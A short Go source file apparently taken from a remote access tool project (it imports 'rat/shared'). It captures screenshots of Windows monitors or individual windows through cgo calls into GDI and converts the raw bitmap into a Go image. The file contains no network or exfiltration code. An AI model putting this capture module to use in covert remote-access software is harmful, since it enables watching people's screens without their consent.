package screen

/*
#cgo LDFLAGS: -lGdi32 -lgdiplus
#include <windows.h>
#include "screen.h"
#include "screen_windows.h"
*/
import "C"

import (
	"image"
	"rat/shared"
	"unsafe"
)

func Capture(monitor shared.Monitor) image.Image {
	m := cMonitor(monitor)

	defer C.Release()
	return handleCapture(C.CaptureMonitor(m))
}

func CaptureWindow(handle int) image.Image {
	defer C.Release()
	return handleCapture(C.CaptureWindow(C.int(handle)))
}

func handleCapture(data C.Capture) image.Image {
	width := int(data.width)
	height := int(data.height)
	size := width * height * 4

	buf := C.GoBytes(unsafe.Pointer(data.data), C.int(size))

	return imageFromBitmap(buf, width, height)
}
